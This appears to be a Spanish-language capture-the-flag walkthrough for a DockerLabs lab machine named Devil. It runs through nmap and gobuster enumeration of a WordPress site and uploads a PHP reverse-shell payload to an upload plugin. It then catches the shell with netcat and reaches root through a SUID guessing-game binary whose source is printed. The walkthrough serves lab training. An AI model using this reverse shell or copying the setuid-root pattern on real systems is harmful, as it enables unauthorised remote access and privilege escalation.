---
icon: flag
---

# Devil DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip devil.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh devil.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-29 10:08 EST
Nmap scan report for 172.17.0.2
Host is up (0.000042s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-generator: Drupal 10 (https://www.drupal.org)
|_http-title: Hackstry
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds
```

Vemos que hay una pagina web activa, por lo que `fuzzearemos` un poco a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r 
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/functions.php        (Status: 200) [Size: 42]
/index.php            (Status: 200) [Size: 94533]
/license.txt          (Status: 200) [Size: 19915]
/server-status        (Status: 403) [Size: 275]
/wp-content           (Status: 200) [Size: 0]
/wp-includes          (Status: 200) [Size: 58940]
/xmlrpc.php           (Status: 200) [Size: 94486]
/wp-trackback.php     (Status: 200) [Size: 94486]
/wp-admin             (Status: 200) [Size: 94486]
/wp-config.php        (Status: 200) [Size: 94486]
Progress: 81876 / 81880 (100.00%)
/wp-login.php         (Status: 200) [Size: 94486]
===============================================================
Finished
===============================================================
```

Encontramos un `Wordpress` instalado, si ponemos la ruta de `wp-admin` vemos que nos salta un dominio llamado `devil.lab` por lo que haremos lo siguiente:

```shell
nano /etc/hosts

#Dentro del nano
<IP>             devil.lab
```

Lo guardamos y ahora si volveremos a entrar a dicha ruta.

```
URL = http://devil.lab/wp-admin
```

Pero no encontraremos nada, si seguimos buscando por el contenido de `wordpress` podremos ver lo siguiente:

```shell
gobuster dir -u http://<IP>/wp-content -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/wp-content
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 0]
/plugins              (Status: 200) [Size: 0]
/themes               (Status: 200) [Size: 0]
/upgrade              (Status: 200) [Size: 774]
/uploads              (Status: 200) [Size: 1182]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Por lo que si seguimos haciendo `fuzzing` con el de `/plugins` veremos lo siguiente:

```shell
gobuster dir -u http://<IP>/wp-content/plugins -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/wp-content/plugins
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/akismet              (Status: 200) [Size: 0]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/backdoor             (Status: 200) [Size: 2135]
/hello.php            (Status: 500) [Size: 0]
/index.php            (Status: 200) [Size: 0]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos una bastante interesante llamada `/backdoor`, si nos metemos dentro veremos una pagina en la que podremos subir un archivo, por lo que subiremos un archivo para hacernos una `reverse shell`.

## Reverse Shell /Backdoor

Crearemos el siguiente archivo:

```shell
nano shell.php

#Dentro del nano
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Ahora subiremos el archivo `shell.php` y nos iremos a una carpeta de `/uploads` viendo nuestro archivo `shell.php`:

```
http://devil.lab/wp-content/plugins/backdoor/uploads/shell.php
```

Cuando subimos el archivo nos aparecera esto:

```
Gracias por enviar tu currículum. Hemos recibido el archivo: shell.php
```

## Escalate user www-data

Y estando a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora ejecutamos el archivo de `/uploads`, echo esto veremos una shell con el usuario `www-data`:

```
listening on [any] 7777 ...
connect to [192.168.120.128] from (UNKNOWN) [172.17.0.2] 53128
whoami
www-data
```

### Sanitizacion Shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user lucas

Si no vamos a la siguiente ruta:

```shell
cd /home/andy/.secret
```

Veremos 2 archivos:

```
-rwxr-xr-x 1 andy andy   512 Sep 11 22:31 escalate.c
-rwxr-xr-x 1 andy andy 16176 Sep 11 22:33 ftpserver
```

Si ejecutamos `ftpserver` seremos el usuario `lucas`:

```shell
./ftpserver
```

Info:

```
UID actual: 1001
EUID actual: 1001
bash: $'\302\241Bienvenido': command not found
```

## Escalate Privileges

Si nos vamos a la siguiente ruta:

```shell
cd /home/lucas/.game
```

Veremos 2 archivos, pero uno de ellos nos interesa ya que tiene permisos `SUID`, a parte de que podemos ver el archivo `.c` por lo que sabemos que lo que hace el archivo es lo siguiente:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    int guess;
    int secret_number = 7; // Número secreto para ganar

    printf("¡Bienvenido al juego de adivinanzas!\n");
    printf("Adivina el número secreto (entre 1 y 10): ");
    scanf("%d", &guess);

    if (guess == secret_number) {
        printf("¡Felicidades! Has adivinado el número.\n");
        printf("Iniciando shell como root...\n");

        // Cambia el UID efectivo a root (0)
        setuid(0);
        system("/bin/bash");
    } else {
        printf("Número incorrecto. Intenta de nuevo.\n");
    }

    return 0;
}
```

Si ejecutamos `EligeOMuere` y seleccionamos el numero `7` veremos que escalaremos a `root` ya que en el codigo se ve que es con el numero `7`.

```
¡Bienvenido al juego de adivinanzas!
Adivina el número secreto (entre 1 y 10): 7
¡Felicidades! Has adivinado el número.
Iniciando shell como root...
```

Y con esto ya seriamos `root`.
